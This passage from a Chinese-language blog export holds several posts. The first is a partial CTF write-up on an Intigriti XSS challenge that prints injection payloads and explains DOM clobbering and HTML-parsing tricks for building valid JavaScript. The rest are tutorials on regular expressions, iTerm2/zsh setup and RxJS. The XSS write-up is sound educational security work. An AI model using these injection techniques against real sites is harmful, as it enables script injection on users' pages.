class=\"light\"> &lt;!-- 底下是注入的值 --> &lt;/h1> &lt;!-- 關閉前面的 h1 --> &lt;/div> &lt;!-- 關閉 id=html 的 div --> &lt;div id=intigriti> &lt;!-- 建立一個沒有關閉標籤的 div --> &lt;div> &lt;!-- 關閉下面那個 div，沒有這個的話上面的 intigriti 就被關閉了 --> &lt;!-- 上面是注入的值 --> &lt;/div> &lt;!-- !!! --> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> 排版過後會是這樣： &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;div id=intigriti> &lt;div>&lt;/div> &lt;!-- !!! --> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> DOM 結構是這樣： 你會很明顯發現 container 被包起來了，而沒有閉合標籤也沒關係，因為瀏覽器會自己幫我們修復，就是這麼神奇。不過照現在這樣，intigriti 的 lastElementChild 會是 &lt;div id=container&gt;，而它的 innerHTML 最後四個字會是 pan&gt;，沒辦法組成合法程式碼，所以我們需要找到一個方法去控制最後四個字。 控制 last4這邊是我卡最久的地方，因為我一直卡在要控制「內容」，想辦法增加內容進去，但礙於結構就是長這樣，所以我沒辦法讓新增的內容變成 last child。不過後來我突然突破了盲點，想到其實不需要控制內容，控制標籤就好了！ 我們可以把它再包起來兩次，像這樣： &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;div id=intigriti> &lt;test1> &lt;test2> &lt;div>&lt;/div> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> 結構就會變成這樣： 如此一來，intigriti 的 last child 就變成 test1，它的 innerHTML 就變成 test2，最後四個字就變成 st2&gt;。這邊我們利用了自定義標籤加上瀏覽器會自動關閉的性質，就可以控制最後四個字。 所以只要把 &lt;test2&gt; 改成 &lt;tes&#39;t2&gt;，last4 就會變成 &#39;t2&gt;，以單引號開頭，達成我們的目標，接著再把 xss 設定為 ;alert(document.domain)，就大功告成了： 預期外的解法這題我做到上面那樣以後，就想說解完了沒我的事情了，然後我也沒預期到會有其他解法（我太天真），直到官方公開了其他人的 writeup，才發現我真的是井底之蛙呱呱呱。 會想寫這篇也是因為那些預期外的解法，每個都可以多學到一些東西，底下我們一個個來看。 利用 HTML 標籤的特殊行為底下技巧學習自 @svennergr 我在解這題的時候，之所以最後會在外面用標籤再包住，是因為如果不這樣做的話，我沒辦法控制 intigriti 底下的 lastElementChild，會變成是 container 那個 div。 但其實有些 HTML 標籤的行為可以突破這個僵局，例如說神奇的 &lt;select&gt;，我們的 payload 傳入：&lt;/h1&gt;&lt;/div&gt;&lt;div id=intigriti&gt;&lt;select&gt;，HTML 就會是這樣： &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;div id=intigriti> &lt;select> &lt;/div> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> 那你猜最後變成了什麼？ select 裡面那一堆標籤居然全都變不見了！ 而 lastElementChild 取的是 element 而不是 node，所以如果我們加上 option，就會變成唯一的 element，再把 &lt;div id=intigriti&gt; 換成 &lt;select id=intigriti&gt;，就會變這樣： 如此一來，就成功控制了 lastElementChild 的內容，達成了我原本以為做不到的事情！ 而另一個神奇的元素叫做 table，我們的程式碼長這樣，payload 是 &lt;/h1&gt;&lt;/div&gt;&lt;table id=intigriti&gt;&lt;tbody&gt;： &lt;div id=\"html\" class=\"text\"> &lt;h1 class=\"light\">&lt;/h1> &lt;/div> &lt;table id=intigriti> &lt;tbody> &lt;/div> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> 可是 render 出來的時候，table 居然自己變成最後一個元素： 我實際嘗試了一下，在 table 內但是不屬於 table 可以利用的元素，就會跳出來，例如說： &lt;body> &lt;table> &lt;tr>&lt;div>123&lt;/div>&lt;/tr> &lt;h1>last&lt;/h1> &lt;/body> 放到 DOM 上面以後會變成： &lt;body> &lt;div>123&lt;/div> &lt;h1>last&lt;/h1> &lt;table> &lt;tbody> &lt;tr>&lt;/tr> &lt;/tbody> &lt;/table> &lt;/body> 而如果我們在 tr 裡面是有註解 &lt;!-- --&gt; 的話，也是可以帶進 tr 內的（用 td 也可以），而更驚奇的來了，intigriti 那個 table 的案例，內容不是 &lt;!-- !!! --&gt; 嗎？所以最後四個字是 --&gt;，這其實是 JS 的註解。 在七月份挑戰中我們得知 &lt;!-- 是註解，但沒想到 --&gt; 居然也是註解，真是大開眼界。 而在原文也有整理了一份清單，直接跑遍每個標籤看哪些可以放在 &lt;select&gt; 跟 &lt;table&gt; 裡面，看起來 &lt;script&gt;, &lt;style&gt; 跟 &lt;template&gt; 都可以出現在裡面而不會被移除掉。 DOM clobbering此解法來自 @airispoison，是我覺得超有創意的解法。 他的 payload 是： ?html=&lt;/div>&lt;form id=intigriti>&lt;button id=lastElementChild>/*&lt;/button>&amp;xss=*/alert(document.domain) 他在 hacking 的是這一段： c = document.getElementById(\"body\").lastElementChild; // 會拿到 &lt;form id=intigriti> if (c.id === \"intigriti\") &#123; l = c.lastElementChild; // 這邊拿到的會是 &lt;button id=lastElementChild>，而不是真的 lastElementChild！ i = l.innerHTML.trim(); f = i.substr(i.length - 4); e = f + e; &#125; 這個解法的巧妙之處是 lastElementChild 原本應該是要拿到 DOM 上的 lastElementChild，結果因為被 DOM clobbering 蓋掉，所以拿到了 id 是 lastElementChild 的 button！ 如此一來，innerHTML 就可控了，就可以傳入任意值組成合法 JS。談到合法 JS，我們最後來看看有哪幾種方法可以組成合法 JS。 組成合法 JS假設我們有一個字串是：)]&#125;&#39;，我們可以在前面加入最多四個字元，在後面加入任意字元，那該怎樣湊出可以執行的 JS 程式碼？ 我自己覺得最直覺的想法之一就是在前面加上單引號，如此一來就變一個字串，後面再加上一些東西就可以執行，像這樣： ')]&#125;';console.log(1) ')]&#125;',console.log(1) ')]&#125;'+console.log(1) 除此之外，單行註解加上換行或是多行註解也是很直覺的想法： //)]&#125;' console.log(1) /*)]&#125;'*/console.log(1) 而從文章中我們知道，其實 JS 還有一些你不知道的註解方式： &lt;!--)]&#125;' console.log(1) -->)]&#125;' console.log(1) 相關的 V8 測試檔在這裡：v8&#x2F;test&#x2F;mjsunit&#x2F;html-comments.js 除了上面這些，還可以用 RegExp！ /()]&#125;'/+console.log(1) /[)]&#125;'/+console.log(1) 結語不只是 JS，HTML 也是博大精深，各種神奇的特性，本來以為這次挑戰算是輕鬆通過，但其實只是用自己本來就會的解法過關而已，比起過關，從其他人的解答中學習似乎更重要，這次挑戰中學到了： &lt;select&gt; 與 &lt;table&gt; 標籤的行為 &lt;!-- 與 --&gt; 當作註解 用 regexp 組出合法程式碼","link":"/2021/11/14/intigriti-xss-1021/"},{"title":"簡易 Regular Expression 入門指南","text":"前言前陣子看到了這個寫得很棒又很漂亮的教學：Regular Expressions for Regular Folk，再加上之前一直沒有在自己的課程裡面教到 Reglar Expresioon，可是這在開發上又滿常見，於是決定寫一篇文章簡單講一下這個主題。 因此呢，這篇是給完全不懂這是什麼的初學者看的，所以會講得滿淺的，會帶到的例子應該也都是相對簡單的東西，模式也比較固定，需要考慮的邊界條件少很多，學習起來我認為也會比較容易。 好，接下來就開始吧！ 什麼是 Regular Expression？要談這個主題的話，我覺得舉例是最棒的，因此底下我會直接舉幾個相關的例子，先帶你了解 Regular Expression 到底是用來做什麼的。 第一個例子：尋找資料假設你今天想要在一個 Excel 試算表裡面尋找資料，那裡面全部都是人名，而你想要找姓「李」的出來，你可能會打開搜尋介面，然後輸入「李」。但這個方法並不是很好，因為不只姓李的會被找出來，只要名字裡面有「李」這個字的都會，所以找出來的資料還要再經過人工篩選一遍。 那該怎麼辦呢？有些搜尋介面可能會有一些選項讓你選，例如說「符合開頭」之類的，如果有的話那就沒問題了，你可以輕鬆的找到姓李的人，但如果是更複雜的例子呢？例如說你想要找「李X明」，符合這個規則的都找出來，這可能很多系統就做不到了，因為沒有提供這種功能。 就算有好了，但是規則可能不太一樣，例如說 A 公司的系統可能要輸入：李%明，B 公司要輸入：李*明。 有沒有一個「通用的規則」，讓我們可以很方便地把這些需求轉成符號跟文字呢？ 第二個例子：驗證資料台灣的手機號碼目前基本上都符合一定的格式，那就是總共十碼，前兩碼是 09，例如說 0912-345-678 或是 0900-111-222 之類的。如果今天有一個字串，我們要驗證他是不是符合台灣的手機號碼格式，可以利用以下三條規則： 一共有 10 位數 開頭要是 09 每一個字元都要是數字 只要符合這三條規則，就可以說它符合格式（但號碼不一定真實存在）。 那如果用程式碼來寫的話該怎麼寫呢？或許可以這樣寫： function isTaiwanMobilePhone(phone) &#123; if (phone.length !== 10) return false if (phone.indexOf('09') !== 0) return false for(let digit of phone) &#123; if (!Number.isInteger(Number(digit))) &#123; return false &#125; &#125; return true &#125; 其實就只是把上面的文字轉換成程式碼的形式而已。 可是像這種格式相關的驗證其實有很多很多，例如說： 驗證家用電話 驗證電子郵件 驗證網址 而這些的本質其實都是一樣的，都是某一種格式而已，只是目前的我們只能用文字來表示這些格式以及規則。 有沒有可能有一種方法，讓我們能夠很方便地把這些需求轉成符號跟文字呢？如果可以的話，那就方便太多了。 第三個例子：抽取資料假設我今天有一大堆的 email，每個 email 都是一行，像是以下的形式： aaa@gmail.com ccc@gmail.com ddd@yahoo.com.tw eee@msn.com fff@ptt.com 但我其實一點都不關心那些帳號是什麼，我關心的是這是哪一家的信箱，所以我想要把這些 email 的網域抽出來，而且更進一步把 .com 或是其他結尾去掉，想要讓我的資料變成這樣： gmail gmail yahoo msn ptt 如果用程式的話可以怎麼做呢？因為每一行要做的處理都是一模一樣的，所以我們示範處理一筆資料就好，要改成多筆就只是用迴圈去跑，然後把每一筆資料都餵進來而已： let email = 'aaa@gmail.com' let temp = email.split('@') // 先用 @ 來分割 let domain = temp[1] // 去掉帳號，只拿後面的 domain let temp2 = domain.split('.') // 把 domain 用點切割 console.log(temp2[0]) // 拿第一個，就會是 gmail （附註：真實的需求跟網域可能會更複雜，這邊只是簡單示範一下概念而已） 不含第一行的資料跟最後一行的輸出，我們一共用了三個步驟，搭配字串相關的方法來處理這個需求。如果把上面的需求用白話文說，其實就是：「我只要從 @ 一直到後面第一個 . 這一段的文字」。 那有沒有可能把這個規則寫成某一種形式，可以快速地表達出這個需求？ 好，不用再賣關子了，相信大家都知道答案是什麼。 有，以上三個問題都有解答，而且答案是同樣的，就是我們的主題：Regular Expression，中文又翻作：「正規表達式」，有時候又會簡寫成 regex 或是 regexp 之類的，都是在講同一個東西。 仔細想想就會發現，這幾個問題的本質其實都是一樣的，就是想要尋找「符合某個特定規則」的字串出來。 第一個範例想要找的是「李X明」第二個範例想要找的是「09xxxxxxxx」第三個範例想要找的是「&#x78;&#x78;&#120;&#64;&#x6f;&#x6f;&#x6f;&#46;&#x78;&#120;&#x78;」，並且只想要 ooo 的部分 而 Regular Expression（以下簡稱 RE） 其實就只是把這些規則用特定的格式轉換成符號而已。之所以需要學這一套，是因為它應用最廣泛，幾乎每個程式語言都有支援，有些編輯器或是網頁甚至也有！ 初探 Regular Expression前面已經提過了，RE 其實就是用一連串的符號來表示想比對的規則，一般來說在寫 RE 的時候，會用 // 把你想表達的規則包住，最簡單的規則就是直接把你想比對的字放進去，例如說：/xyz/，就是在判斷一個字串有沒有包含「xyz」這連續的三個字： 截圖的這個網站叫做 RegEx101，可以在上面提供你的 RE 以及要比對的字串，會自動幫你比對並顯示相關資訊，上圖藍色的就是比對到的部分。 所以你可以用 /xyz/ 來找出一個字串有沒有包含 xyz，還可以知道 xyz 出現在哪一個位置。 不過這樣子的功能當然沒辦法滿足我們的需求，所以接著要來看一個很強大的符號：[]，中括號裡面可以放一大堆東西，只要有一個字符合就是符合，例如說：/[aeiou]/就是在比對一個字串是否包含任意一個母音： 既然可以放一大堆字，那當然也能這樣放：/[0123456789]/，就可以比對數字了！那字母呢？難道說要 /[abcdefghijklmnopqrstuvwxyz]/ 嗎？這樣未免也太長了。 針對這種「連續」的東西，可以用-來表示，例如說：/[0-9]/ 跟 /[a-z]/ 就分別是數字跟小寫字母了： 如果是大寫字母的話可以用 /[A-Z]/，而且這些規則可以合併使用，例如說：/[0-9a-z]/，就可以比對到「數字或小寫字母」，而/0-9a-zA-Z/ 就是一般常見的「數字或英文字母」。 不過這邊要再強調一次，[]這個東西只會比對到「一個字」，所以只要有一個字符合，就是符合這個規則。 再來呢，如果每次比對數字或字母都要輸入這麼多字的話顯然很浪費時間，所以針對這些常出現的規則，有提供更方便的方法。這些規則通常都會以\\ 開頭，例如說 /\\d/，其實就是 /[0-9]/ 的意思（d 就是 digit），\\d 就表示一個數字，所以如果我打：/\\d\\d\\d/ 就是要比對三個數字： 還有另外一個常用的是 \\w（w 應該是 word 的意思），會比對數字、英文大小寫字母還有底線，換句話說，其實/\\w/ 就等於 /[a-zA-Z0-9_]/。 最後還有一個神奇的符號，就是一個點：/./，點就是「任意字元」的意思，可以比對到任何一個字。 綜合以上所述，大家可以想想看以下哪些字串可以配對到這個 RE：/\\w\\w\\w.\\d\\d\\d/。 000000 9999999 aaaaaaa 0a0a000 0a0a0a0 cc3c777 cccc777 答案： 看到這邊，如果你想比對一個「固定長度」而且模式較為簡單的東西的話，應該已經難不倒你了，因為你已經可以利用[]、.、\\d、\\w這幾個符號去湊出想要的模式。 例如說前面提過的手機號碼： 一共有 10 位數 開頭要是 09 每一個字元都要是數字 不就是 /09\\d\\d\\d\\d\\d\\d\\d\\d/ 嗎？ 咦…不對啊，為什麼 09112223334 這個有 11 位數的也被比對到了？ 這是因為正規表達式所配對的是「部分」的字串，只要你整個字串裡面有一部分符合，就會被配對到。所以如果你想要用上面那個正規表達式來檢測一個字串是不是手機號碼的話，是行不通的，你還需要兩個東西。 第一個叫做：^，這是字串開頭的意思；第二個叫做：$，這是字串結尾的意思。簡單來說呢，/xyz/會配對到任何「有包含 xyz 三個字」的字串，像是 AxyzB 或是 xyzAB 都可以，然後 /^xyz/ 則是任何「開頭是 xyz」的字串，例如說 xyzAB 或是 xyz。 所以如果你要比對手機號碼，就可以把這兩個符號加上去，變成 /^09\\d\\d\\d\\d\\d\\d\\d\\d$/，就大功告成了。 實際使用 Regular Expression雖然我們的確把手機號碼的 RE 寫出來了沒錯，但你沒有覺得很奇怪嗎？ 平常我們寫程式的時候，只要是重複的東西都可以透過迴圈或是函式來做簡化，那正規表達式應該也有「重複」的符號吧？ 有，在你想要重複的後面加上 &#123;&#125; 就好，例如說 /^09\\d&#123;8&#125;$/ 就代表 \\d 會重複八次，就不用自己再寫那麼多了。 重複次數的話還有幾種不同的用法，例如說剛剛用的 &#123;8&#125; 代表一定要 8 個，而 &#123;8,10&#125; 則是 8~10 個都可以，&#123;8,&#125; 的話則是「8 以上」的意思。 講了這麼多，都只是紙上談兵，我們立刻來實驗看看，這邊用 JS 來做示範： var re = /^09\\d&#123;8&#125;$/ console.log(re.test(\"0911222333\")) // true console.log(re.test(\"1911222333\")) // false console.log(re.test(\"09112223332\")) // false console.log(re.test(\"091222333\")) // false 在 JS 裡面，只要你依照我們前面講的格式，把 RE 用 // 包起來，就自動會變成一個 RegExp 的物件，而你可以用它的 test 這個方法來跟字串做比對。 如果你不喜歡用 // 的話，用 new RegExp 也是可以的，只是要特別注意在字串中要把 \\d 改成 \\\\d，不然的話會被當作跳脫字元來看待： var re = new RegExp('^09\\d&#123;8&#125;$') // => /^09d&#123;8&#125;$/ var re = new RegExp('^09\\\\d&#123;8&#125;$') // => /^09\\d&#123;8&#125;$/ 所以呢，若是你想要驗證某個字串是不是符合 RE，用 test 方法就對了。那如果是想要找配對的呢？ 例如說我們前面講的例子：李X明，寫成 RE 就會變成：/李.明/。 如果要找配對到的字的話，方法不太一樣。剛剛在測試的時候我們是：RE.test(字串)，要配對的話要反過來，變成：字串.match(RE)，意思就是拿 RE 去跟字串做比對，主體不太一樣。 var re = /李.明/ var str = '李曉明王阿明王小明李大明太大明阿明無名小站' console.log(str.match(re)) /* 輸出： 0: \"李曉明\" groups: undefined index: 0 input: \"李曉明王阿明王小明李大明太大明阿明無名小站\" */ 如果有配對到的話，返回值會是一個陣列，否則的話會是 null。可是以上這個方法我只能配對到一個，如果我想配對到全部的呢？可以使用 matchAll： var re = /李.明/ var str = '李曉明王阿明王小明李大明太大明阿明無名小站' console.log(str.matchAll(re)) /* 輸出：Uncaught TypeError: String.prototype.matchAll called with a non-global RegExp argument */ 出現了一個 non-global RegExp argument 的錯誤訊息，這是什麼意思呢？ 正規表達式除了那些配對用的符號以外，還有一些標誌（flag，或你也可以簡單想成是參數）可以設置，例如說 /xyz/ 只會配對到小寫 xyz，但如果你加上一個 i（我猜是 ignore case 的意思），變成 /xyz/i，就會忽略大小寫。 加在 / 後面的那個就是 flag，要加多個的話就繼續加上去就好了，而 g 這個 flag 代表 global，就是「我全都要」的意思，會配對到多個字串，所以上面的範例要加上 g，變成： var re = /李.明/g var str = '李曉明王阿明王小明李大明太大明阿明無名小站' var result = str.matchAll(re) console.log(result) // RegExpStringIterator console.log(...result) 使用 matchAll 以後會返回一個 Iterator，你可以用 for...of 去把值取出來，或者是用 [...result] 把它轉為一個陣列，就可以看到所有的結果。 如此一來呢，我們前面提到的三個問題，有兩個問題都被解掉了，現在只剩下最後一個了，那就是：比對「&#x78;&#120;&#x78;&#x40;&#111;&#111;&#x6f;&#46;&#x78;&#x78;&#x78;」，並且只想要 ooo 的部分。 這個模式的難點有兩個： ooo 是不固定的字數 要取的是某個部份，而不是整個 pattern 前面我們已經講過 &#123;8&#125; 可以用來指定次數了，那如果是不固定的次數怎麼辦呢？一樣有一個符號幫我們做這件事，就是+，他的意思是：「一個以上」，所以/^A\\d+Z$/ 就會配對到任何開頭是 A，結尾是 Z，中間有一個以上的數字的字串： 再來有一組神奇的符號，叫做 ()，就是大家最常見的小括號，專有名詞叫做 Capturing Groups。這是做什麼用的呢？就是把這裡面符合的模式抓出來的意思。 像是我們可以把剛剛的/^A\\d+Z$/改掉，在中間數字的部分加上括號，就變成： /^A(\\d+)Z$/，乍看之下沒什麼差，但我們可以用 match 跑跑看： var re = /^A(\\d+)Z$/ console.log('A12345Z'.match(re)) /* 0: \"A12345Z\" 1: \"12345\" groups: undefined index: 0 input: \"A12345Z\" length: 2 */ 原本 match 的時候陣列只會有一筆資料，但現在又多一組了，而那一組就是我們用 () 框起來的部分，代表：「我想要知道這裡面配對到的東西」。 有了兩大神器 + 跟 () 以後，就可以來試著解決前面提到的問題了： 我們可以先配對字串開頭：/^/接著加上前面帳號跟 @：/^.+@/然後配對後面的 domain 並且記起來：/^.+@(.+)/最後再以 . 做結尾，記得做跳脫，前面要加個 \\：/^.+@(.+)\\./ 下圖中綠色就是我們 () 記起來的部分： 除了 yahoo.com.tw 那個以外，其他的都成功了！ 那 yahoo.com.tw 為什麼會失敗呢？因為你會發現以我們的規則來說，其實以下兩個狀態都符合： (.+)\\. 前面記憶的部分配對到 yahoo.com，後面 . 配對到 .tw 開頭的點 (.+)\\. 前面記憶的部分配對到 yahoo，後面 . 配對到 .com 開頭的點 第一種狀況是(.+)的部分盡量配對越多越好，第二種則是相反，配對越少越好。 而以我們寫出來的 RE 來說，其實會屬於第一種，也就是配對越多越好，所以才會變成 yahoo.com 而不是我們所期待的 yahoo。 那如果想要變成第二種：配對越少越好，這應該怎麼辦呢？很簡單，+ 後面加一個 ? 就好： 寫成程式碼的話就會變這樣： var emails = [ 'aaa@gmail.com', 'ccc@gmail.com', 'ddd@yahoo.com.tw', 'eee@msn.com', 'fff@ptt.com' ] var re = /^.+@(.+?)\\./ for(let email of emails) &#123; var result = email.match(re) console.log(result[1]) &#125; /* gmail gmail yahoo msn ptt */ 做到這邊，我們開頭談的三個情境都已經用 Regular Expression 完美地解決了！ 總結這篇主要的目的就只想簡單講一下 Regular Expression 這東西，所以帶到的範例相對簡單，然後講到的東西也不多。 這邊稍微提一下一些基本的但我沒講到的，例如說原本 \\d 是配對數字，如果把 d 變成大寫，就會變成反義，所以 \\D 代表：不是數字，而 \\W 也一樣，代表：不是「英文大小寫字母與數字與底線」。 再來就是 + 前面有提過是一個以上，如果你想要零個以上，可以用 *，然後還有一個特殊的字 \\s 可以配對到任何空白（空白字元、tab 以及換行）。 正規表達式如果要寫到超級複雜的話可以變很複雜，規則也超級多，但一般來說基本的應該就滿夠用了。 最後再次推薦開頭的教學：Regular Expressions for Regular Folk，網頁很漂亮，提供的範例也都很實際，很推薦大家參考看看。","link":"/2020/05/16/introduction-to-regular-expression/"},{"title":"[心得] iTerm2 + zsh，打造更好的工作環境","text":"平常有在寫 code 的，無論是寫哪一種程式語言、或是哪一種開發環境，都會有一定的時間需要執行一些命令這時候就會開啟 terminal 開始鍵入指令，最常用的像是cd, ls, git, ssh, rsync之類的可是系統內建的終端機其實滿難用的，今天要跟大家推薦一套比較好的選擇 iTerm2可以取代你的終端機，裝了以後保證你每次都不會想要打開內建的，而是打開這個應用程式。用這個有什麼好處呢？第一就是很多設定可以調、可以個人化；第二就是介面比較好看，也比較好操作；第三則是可以開很多個分頁，就跟你用瀏覽器一樣，如果要分割畫面的話也是很容易的。 裝好以後可以先來挑個自己中意的佈景主題，很多人都用 solarized，但我自己是比較喜歡 dracula。這邊純粹看你自己覺得哪套比較好看就裝哪個。 外觀都弄的差不多之後，可以開始來裝 zsh 了zsh 是什麼呢？這個就要先從 bash 開始講了，你現在無論是打開 iTerm2 或是內建的終端機，出現的畫面都是在執行 bash 的畫面，所以 bash 也是一個程式，那當然也可以被取代掉。我自己用過的兩套一套就是 zsh，另一套是 fish其實 fish 我用的滿不錯的，但看到 zsh 好像外掛比較多、佈景主題也比較多所以就跳過來了，fish 我覺得內建的功能就滿夠用了，尤其是自動提示的功能超 OP，每次都覺得很厲害 至於 zsh 的話，其實 mac 就有內建了，但除了這個以外，推薦必裝的東西叫做：oh-my-zsh，他先幫你載好一些主題、外掛跟設定，簡單來說可以看成是 zsh 的懶人包版本，裝了之後有一堆東西可以用。 ~/.zshrc是你的設定檔，要調什麼都來這邊調就對了 裝好以後第一件事情當然還是換主題，或是也可用random，每次開啟的時候都會用不同的主題，也是滿特別的。agnoster是一套滿 fancy 的主題，要裝之前記得先 安裝字型，並且在 iTerm2裡面的 Preference -&gt; Profile -&gt; Text 調整好字型，才能夠正確看到一些特殊符號。 我自己是用 tonotdo這個主題然後再改了一下，他原本時間在最右邊，我把它調到最左邊然後上色這個主題還滿容易改的，檔案在~/.oh-my-zsh/themes/tonotdo.zsh-theme，我把前三行改成： PROMPT&#x3D;&#39;%&#123;$fg_no_bold[yellow]%&#125;[%*] %&#123;$fg_no_bold[cyan]%&#125;%n%&#123;$fg_no_bold[red]%&#125; ➜ %&#123;$fg_no_bold[green]%&#125;%3~$(git_prompt_info)%&#123;$reset_color%&#125;» &#39; 大家可以自己試著改改看，滿容易的 裝好佈景主題以後開始來裝外掛，oh-my-zsh wiki裡面有介紹了一下每個內建外掛是在做什麼，只要在設定檔加一些字就可以使用了，預設只會幫你啟用git。如果想裝更多的，在awesome-zsh-plugins可以找到，我自己就多裝了zsh-autosuggestions。 介紹到這邊就差不多了，剩下都是個人設定微調的部份，或是裝一些自己覺得實用的 plugin附上一張我的 iTerm2 截圖當做結尾 參考資料： 認識與學習BASH iTerm - 让你的命令行也能丰富多彩 Mac OS X 的 Command Line 環境設定 [iTerm2] 美化你的Terminal bash 轉移 zsh (oh-my-zsh) 設定心得 Oh-My-Zsh 讓你的終端機更強大更美觀","link":"/2016/01/03/iterm2-zsh-better-environment/"},{"title":"希望是最淺顯易懂的 RxJS 教學","text":"前言關注 RxJS 已經好一段時間了，最早知道這個東西是因為 redux-observable，是一個 redux 的 middleware，Netflix 利用它來解決複雜的非同步相關問題，那時候我連redux-saga都還沒搞懂，沒想到就又有新的東西出來了。 半年前花了一些時間，找了很多網路上的資料，試圖想要搞懂這整個東西。可是對我來說，很多教學的步調都太快了，不然就是講得太仔細，反而讓初學者無所適從。 這次有機會在公司的新專案裡面嘗試導入redux-observable，身為提倡要導入的人，勢必要對這東西有一定的瞭解。秉持著這個想法，上週認真花了點時間再次把相關資源都研究了一下，漸漸整理出一套「我覺得應該可以把 RxJS 講得更好懂」的方法，在這邊跟大家分享一下。 在開始之前，要先大力稱讚去年 iT 邦幫忙鐵人賽的 Web 組冠軍：30 天精通 RxJS，這系列文章寫得很完整，感受得出來作者下了很多功夫在這上面。看完這篇之後如果對更多應用有興趣的，可以去把這系列的文章讀完。 好，那就讓我們開始吧！ 請你先忘掉 RxJS沒錯，你沒看錯。 要學會 RxJS 的第一件事情就是：忘記它。 忘記有這個東西，完全忘記，先讓我講幾個其他東西，等我們需要講到 RxJS 的時候我會再提醒你的。 在我們談到主角之前，先來做一些有趣的事情吧！ 程式基礎能力測試先讓我們做一個簡單的練習題暖身，題目是這樣的： 有一個陣列，裡面有三種類型的資料：數字、a~z組成的字串、數字組成的字串，請你把每個數字以及數字組成的字串乘以二之後加總範例輸入：[1, 5, 9, 3, ‘hi’, ‘tb’, 456, ‘11’, ‘yoyoyo’] 你看完之後應該會說：「這有什麼難的？」，並且在一分鐘以內就寫出下面的程式碼： const source = [1, 5, 9, 3, 'hi', 'tb', 456, '11', 'yoyoyo']; let total = 0; for (let i = 0; i &lt; source.length; i++) &#123; let num = parseInt(source[i], 10); if (!isNaN(num)) &#123; total += num * 2; &#125; &#125; 相信大家一定都是很直覺的就寫出上面的程式碼，但如果你是個 functional programming 的愛好者，你可能會改用另外一種思路來解決問題： const source = [1, 5, 9, 3, 'hi', 'tb', 456, '11', 'yoyoyo']; let total = source .map(x => parseInt(x, 10)) .filter(x => !isNaN(x)) .map(x => x * 2) .reduce((total, value) => total + value ) 一開始的例子叫做Imperative（命令式），用陣列搭配一堆函式的例子叫做Declarative（聲明式）。如果你去查了一下定義，應該會看到這兩個的解釋： Imperative 是命令機器去做事情（how），這樣不管你想要的是什麼（what），都會按照你的命令實現；Declarative 是告訴機器你想要的是什麼（what），讓機器想出如何去做（how） 好，你有看懂上面這些在說什麼嗎？ 我是沒有啦。 所以讓我們再看一個例子，其實 Declarative 你已經常常在用了，只是你不知道而已，那就是 SQL： SELECT * from dogs INNER JOIN owners WHERE dogs.owner_id = owners.id 這句話就是：我要所有狗的資料加上主人的資料。 我只有說「我要」而已，那要怎麼拿到這些資料？我不知道，我也不用知道，都讓 SQL 底層決定怎麼去操作就好。 如果我要自己做出這些資料，在 JavaScript 裡面我必須這樣寫（程式碼取自声明式编程和命令式编程的比较）： //dogs = [&#123;name: 'Fido', owner_id: 1&#125;, &#123;...&#125;, ... ] //owners = [&#123;id: 1, name: 'Bob'&#125;, &#123;...&#125;, ...] var dogsWithOwners = [] var dog, owner for(var di=0; di &lt; dogs.length; di++) &#123; dog = dogs[di] for(var oi=0; oi &lt; owners.length; oi++) &#123; owner = owners[oi] if (owner &amp;&amp; dog.owner_id == owner.id) &#123; dogsWithOwners.push(&#123; dog: dog, owner: owner &#125;) &#125; &#125; &#125; 應該可以大致體驗出兩者的差別吧？後者你必須自己一步步去決定該怎麼做，而前者只是僅僅跟你說：「我想要怎樣的資料」而已。 接著我們再把目光放回到把數字乘以二相加的那個練習。對我來說，最大的不同點是後面那個用陣列搭配函式的例子，他的核心概念是： 把原始資料經過一連串的轉換，變成你想要的資訊 這點超級重要，因為在一開始的例子中，我們是自己一步步去 parse，去檢查去相加，得出數字的總和。而後面的那個例子，他是把原始的資料（陣列），經過一系列的轉換（map, filter, reduce），最後變成了我們想要的答案。 畫成圖的話，應該會長這樣（請原諒我偷懶把乘二的部分拿掉了，但意思不影響）： 把原始資料經過一連串的轉換，最後變成你想要的答案，這點就是後者最大的不同。只要你有了這個基礎知識之後，再來看 